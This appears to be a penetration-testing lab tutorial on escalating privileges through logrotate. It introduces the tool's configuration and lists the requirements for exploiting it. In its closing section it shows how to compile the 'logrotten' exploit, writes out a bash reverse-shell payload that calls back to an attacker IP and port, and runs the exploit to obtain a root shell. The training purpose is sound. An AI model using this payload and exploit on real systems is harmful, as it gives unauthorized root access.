## Table of Contents

  - [Table of Contents](#Table\of\Contents)

## Table of Contents


Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` take care of archiving or disposing of old logs. It no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, `logrotate` has been developed. The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions. ALmost more important are the unnoticed system details, such as whether all services are running correctly.

`logrotate` has many features for managing these log files. These include the specification of:
- The `size` of the log file
- `age`
- and the `action` to be taken when one of these factors is reached.

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.

Logrotate

```shell
gdxqpardo@htb[/htb]$ cat /etc/logrotate.conf
```


To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

Logrotate

```shell
gdxqpardo@htb[/htb]$ sudo cat /var/lib/logrotate.status
```


We can find the corresponding configuration files in `/etc/logrotate.d` directory



```shell-session
gdxqpardo@htb[/htb]$ ls /etc/logrotate.d/
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.

```shell
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`


```shell
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

Logrotate

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

